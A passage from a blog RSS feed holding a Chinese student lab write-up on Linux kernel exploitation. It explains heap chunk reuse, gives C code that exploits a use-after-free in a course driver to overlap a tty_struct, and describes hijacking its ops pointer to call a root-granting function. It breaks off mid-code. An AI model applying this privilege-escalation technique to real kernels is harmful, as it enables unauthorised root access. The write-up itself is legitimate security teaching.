@@ -1,0 +1,1456 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Linux on Jiacheng Hu</title><link>https://unicocn.github.io/tags/linux/</link><description>Recent content in Linux on Jiacheng Hu</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Wed, 07 Jun 2023 23:50:00 +0000</lastBuildDate><atom:link href="https://unicocn.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml"/><item><title>JOP | Linux内核攻防</title><link>https://unicocn.github.io/p/jop/</link><pubDate>Wed, 07 Jun 2023 23:50:00 +0000</pubDate><guid>https://unicocn.github.io/p/jop/</guid><description>&lt;img src="https://unicocn.github.io/p/jop/cover.jpg" alt="Featured image of post JOP | Linux内核攻防" />&lt;h1 id="lab3-jop--linux内核漏洞攻防">Lab3 JOP | Linux内核漏洞攻防&lt;/h1>
+&lt;blockquote>
+&lt;p>Link: &lt;a class="link" href="https://zjusec.gitee.io/syssec23-stu/lab3/" target="_blank" rel="noopener"
+>https://zjusec.gitee.io/syssec23-stu/lab3/&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="思考题1">思考题1&lt;/h2>
+&lt;blockquote>
+&lt;p>Q1. 为什么在堆上分配相同大小内存的时候，两次分配的内存地址会一样&lt;/p>
+&lt;/blockquote>
+&lt;p>Linux内核在堆上分配内存时，通常会使用如下系统调用&lt;/p>
+&lt;ul>
+&lt;li>malloc(分配小块内存时调用)
+&lt;ul>
+&lt;li>brk：将数据段(.data)的最高地址指针&lt;code>_edata&lt;/code>往高地址推（从堆头开始，参数为地址）&lt;/li>
+&lt;li>sbrk：将地址指针往高地址推（从当前指针位置开始，参数为指针增量）&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>mmap(默认分配大于128k内存时调用)&lt;/li>
+&lt;/ul>
+&lt;p>由于频繁的分配释放内存容易产生碎片，并且会影响性能，因此Linux引入了基于内存池的内存管理方式，堆内存的分配和回收进行统一管理，对于每一块内存称之为chunk&lt;/p>
+&lt;p>被用户free掉的chunk，通过指针连接成链表，不同大小的内存连接成不同的链表，每一个链表称之为bin，当再次需要分配某一个大小的内存时，就在对应大小的chunk连接成的bin中分配即可，进而减少碎片，也可以提高内存分配效率&lt;/p>
+&lt;p>因此当我们在堆上分配相同大小内存时，被free的内存被接入bin中，再次分配相同大小的内存就会从bin上分配，进而极大增加了分配到的内存地址相同的概率；这也就解释了为什么在UAF利用中，两次分配的内存地址会一样&lt;/p>
+&lt;h2 id="task1设备接口的使用--思考题2">Task1：设备接口的使用 &amp;amp; 思考题2&lt;/h2>
+&lt;ol>
+&lt;li>根据UAF的原理，我们先两次打开&lt;code>/dev/zjudev&lt;/code>设备，分配并释放大小为&lt;code>sizeof(tty_struct)&lt;/code>的缓冲区，这样做是为了之后打开&lt;code>/dev/ptmx&lt;/code>设备，分配&lt;code>tty_struct&lt;/code>结构体时能够分配到与&lt;code>/dev/zjudev&lt;/code>相同地址的缓冲区&lt;/li>
+&lt;li>之后我们打开&lt;code>/dev/ptmx&lt;/code>设备，并判断是否分配到了与&lt;code>/dev/zjudev&lt;/code>相同的缓冲区；判断的方法是，我们观察&lt;code>tty_struct&lt;/code>结构体：&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">struct&lt;/span> &lt;span class="n">tty_struct&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">magic&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">kref&lt;/span> &lt;span class="n">kref&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">device&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">dev&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="cm">/* class device or NULL (e.g. ptys, serdev) */&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">tty_driver&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">driver&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">const&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">tty_operations&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">ops&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// ...
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">/* tty magic number */&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define TTY_MAGIC 0x5401
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>在结构体的起始地址有一个&lt;code>magic&lt;/code>变量，其值会被初始化成&lt;code>0x5401&lt;/code>，而我们尽管不知道&lt;code>tty_struct&lt;/code>结构体的地址，但是可以通过读取&lt;code>/dev/zjudev&lt;/code>分配的缓冲区内容，判断最开始的四个字节是否为&lt;code>0x5401&lt;/code>即可&lt;/p>
+&lt;ol start="3">
+&lt;li>具体实现上，可以使用一个死循环，不断打开&lt;code>/dev/ptmx&lt;/code>设备，判断&lt;code>/dev/zjudev&lt;/code>的缓冲区内容是否为&lt;code>0x5401&lt;/code>，当结果为是，则跳出循环，返回&lt;code>ptmx&lt;/code>的文件描述符&lt;/li>
+&lt;li>之后，我们就可以通过调用&lt;code>/dev/zjudev&lt;/code>设备的&lt;code>write&lt;/code>接口，修改缓冲区内容，进而修改&lt;code>tty_struct&lt;/code>结构体的内容&lt;/li>
+&lt;/ol>
+&lt;blockquote>
+&lt;p>Q2. 如何确定自己所控制的指针一定被分配给&lt;code> tty_struct&lt;/code>结构体&lt;/p>
+&lt;/blockquote>
+&lt;p>见之前的分析，通过&lt;code>tty_struct&lt;/code>结构体开头的&lt;code>magic&lt;/code>变量的值进行判断&lt;/p>
+&lt;p>附代码：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define TTY_STRUCT_SIZE 0x2B8
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define TTY_MAGIC 0x5401
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">size_t&lt;/span> &lt;span class="n">tty_op_buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">36&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">char&lt;/span> &lt;span class="n">tty_buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">TTY_STRUCT_SIZE&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">init_dev&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">dev1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/dev/zjudev&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">O_RDWR&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">dev2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/dev/zjudev&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">O_RDWR&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ioctl&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dev1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x0001&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">TTY_STRUCT_SIZE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dev1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">dev2&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">init_ptmx&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">dev_fd&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">ptmx_fd&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">(;;)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ptmx_fd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/dev/ptmx&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">O_RDWR&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">O_NOCTTY&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tty_buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">tty_buf&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dev_fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">tty_buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">TTY_STRUCT_SIZE&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">size_t&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">TTY_STRUCT_SIZE&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">v_str&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">9&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">v_str&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">tty_buf&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v_str&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sc">&amp;#39;\0&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;tty_buf + %lu = 0x%lx&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">size_t&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">v_str&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">size_t&lt;/span> &lt;span class="n">magic&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">memcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">magic&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">tty_buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">magic&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">TTY_MAGIC&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;TTY_MAGIC match! ptmx_fd = %d&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ptmx_fd&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">ptmx_fd&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">[])&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">dev_fd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">init_dev&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">ptmx_fd&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">init_ptmx&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dev_fd&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="task2简单获取root-shell--思考题3">Task2：简单获取root shell &amp;amp; 思考题3&lt;/h2>
+&lt;ol>
+&lt;li>观察&lt;code>tty_struct&lt;/code>结构体，我们可以发现有一个&lt;code>const struct tty_operations* ops&lt;/code>指针，其指向的是一组可以被调用的函数指针，当我们对&lt;code>/dev/ptmx&lt;/code>设备进行操作时，调用的就是其中的函数；&lt;code>struct tty_operations&lt;/code>的具体结构如下：&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">struct&lt;/span> &lt;span class="n">tty_operations&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">tty_struct&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">lookup&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">tty_driver&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">driver&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">file&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">filp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">idx&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">install&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">tty_driver&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">driver&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">tty_struct&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">tty&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">void&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">remove&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">tty_driver&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">driver&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">tty_struct&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">tty&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">open&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">tty_struct&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">tty&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">file&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">filp&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">void&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">close&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">tty_struct&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">tty&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">file&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">filp&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">void&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">shutdown&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="n">tty_struct&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">tty&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// ...
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ol start="2">
+&lt;li>由于我们之前使得&lt;code>tty_struct&lt;/code>的地址和&lt;code>/dev/zjudev&lt;/code>中分配的缓冲区起始地址相同，那么我们就可以通过覆写缓冲区进而修改&lt;code>ops&lt;/code>指针的值，而我们完全可以将&lt;code>ops&lt;/code>指向一块大小和&lt;code>tty_operations&lt;/code>相同的区域，但里面的函数指针全都指向&lt;code>hack_cred&lt;/code>函数的地址，那么我们就可以通过调用&lt;code>/dev/ptmx&lt;/code>设备的方法，进而调用&lt;code>hack_cred&lt;/code>函数，获取root权限&lt;/li>
+&lt;li>首先我们需要获得&lt;code>hack_cred&lt;/code>的函数地址，由于没有开始ASLR，因此直接在&lt;code>System.map&lt;/code>里面查表即可&lt;/li>
+&lt;/ol>
+&lt;p>&lt;img src="https://unicocn.github.io/p/jop/image-20230606192029887.png"
+width="475"
+height="45"
+srcset="https://unicocn.github.io/p/jop/image-20230606192029887_hud3e3b0f42cad2c8d4d5e4b02d0bbbb7a_5073_480x0_resize_box_3.png 480w, https://unicocn.github.io/p/jop/image-20230606192029887_hud3e3b0f42cad2c8d4d5e4b02d0bbbb7a_5073_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image 1"
+class="gallery-image"
+data-flex-grow="1055"
+data-flex-basis="2533px"
+>&lt;/p>
+&lt;ol start="4">
+&lt;li>可以看到&lt;code>tty_operations&lt;/code>中共有36个函数指针，每个函数指针大小为8B，因此我们创建一个大小为36*8B的数组&lt;code>tty_op_buf&lt;/code>，其中所有函数指针都指向&lt;code>hack_cred&lt;/code>，之后获取&lt;code>ptr = &amp;amp;tty_op_buf&lt;/code>，将&lt;code>ptr&lt;/code>覆盖&lt;code>ops&lt;/code>指针，进而调用&lt;code>hack_cred&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;blockquote>
+&lt;p>Q3. 为什么不能直接通过 UAF 控制 cred 结构体直接修改其内容？有没有办法能够通过 UAF 来利用新版本的 cred 结构体呢？&lt;/p>
+&lt;/blockquote>
+&lt;p>在Linux kernel 4.5版本之前是可以的，但是在Linux kernel 4.5版本及之后就不可以了，可以比较kernel 4.5版本对&lt;code>cred_init&lt;/code>函数的修改(参考了https://zhuanlan.zhihu.com/p/437464189)&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="mf">4.4.72&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">/*
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * initialise the credentials stuff
